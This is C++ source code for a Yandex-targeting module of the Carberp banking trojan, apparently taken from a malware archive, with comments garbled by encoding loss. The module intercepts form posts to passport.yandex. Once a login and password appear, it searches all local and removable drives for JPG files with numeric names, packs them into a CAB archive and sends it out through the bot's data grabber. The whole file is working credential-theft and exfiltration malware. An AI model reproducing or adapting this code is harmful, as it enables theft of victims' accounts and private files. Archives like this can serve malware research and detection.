/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */

#include "Modules.h"

#ifdef YandexH
//----------------------------------------------------------------------------

#include "PostDataGrabber.h"
#include "BotDebug.h"
#include "CabPacker.h"
#include "Inject.h"
#include "Loader.h"

namespace YANDEXSYSTEMS
{
	#include "DbgTemplates.h"
}

#define YADBG YANDEXSYSTEMS::DBGOutMessage<>

namespace YandexSearchJpg
{
	struct JpgCab
	{
		HCAB cab;
		int count; //���������� ����������� ������
	};


	static void FindJpg(PFindData Search, PCHAR FileName, LPVOID Data, bool &Cancel )
	{
		JpgCab* jpgcab = (JpgCab*)Data;
		if( Search->nFileSizeLow > 80000 && Search->nFileSizeLow < 200000 )
		{
			int i = 0;
			//������� ���������� ���� � �����
			while( Search->cFileName[i] >= '0' && Search->cFileName[i] <= '9' ) i++;
			if( i == 14  )
			{
				YADBG( "Yandex", "����� ���� %s, %s", FileName, Search->cFileName );
				AddFileToCab( jpgcab->cab, FileName, Search->cFileName );
				jpgcab->count++;
			}
		}
	}


	DWORD WINAPI StartSearch(void*)
	{
		YADBG( "Yandex", "����� ������" );
		DWORD drives = (DWORD)pGetLogicalDrives();
		char drive[] = { 'C', ':', '\\', 0 };
		char nameCab[MAX_PATH];
		File::GetTempName(nameCab);
		JpgCab jpgcab;
		jpgcab.cab = CreateCab(nameCab);
		jpgcab.count = 0;
		if( jpgcab.cab != 0 )
		{
			//������� � ��������� ������, ��� ��� ��� ��������� ������, ����� ������ ��������� �� ���� ��� �� �������
			for( int b = 31; b >= 2; b-- )
			{
				if( drives & (1 << b) )
				{
					drive[0] = 'A' + b;
					int tp = (int)pGetDriveTypeA(drive);
					//������� ������ ������ � ������� �����
					if( tp == DRIVE_REMOVABLE || tp == DRIVE_FIXED )
					{
						YADBG( "Yandex", "���� �� ����� %s", drive );
						SearchFiles( drive, "*.jpg", true, FA_ANY_FILES, (LPVOID)&jpgcab, FindJpg );
					}
				}
			}
			CloseCab(jpgcab.cab);
			if( jpgcab.count > 0 )
			{
				YADBG( "Yandex", "������� %d ��������", jpgcab.count );
				DataGrabber::SendCabDelayed( 0, nameCab, "yad" );
			}
			pDeleteFileA(nameCab);
		}
		YADBG( "Yandex", "����� ������" );
		return 0;
	}

	void PostReceiver( PostDataGrabber::ParamEvent& e )
	{
		if( WildCmp( (char*)e.data, "*login*passwd*" ) )
		{
			YADBG( "Yandex", "��������� ����� jpg ������" );
			MegaJump(StartSearch);
		}
	}

	bool Init()
	{
		PostDataGrabber::Receiver* rv = PostDataGrabber::AddReceiver( "*passport.yandex*", PostReceiver );
		if( rv )
			return true;
		return false;
	}

};


//----------------------------------------------------------------------------
#endif
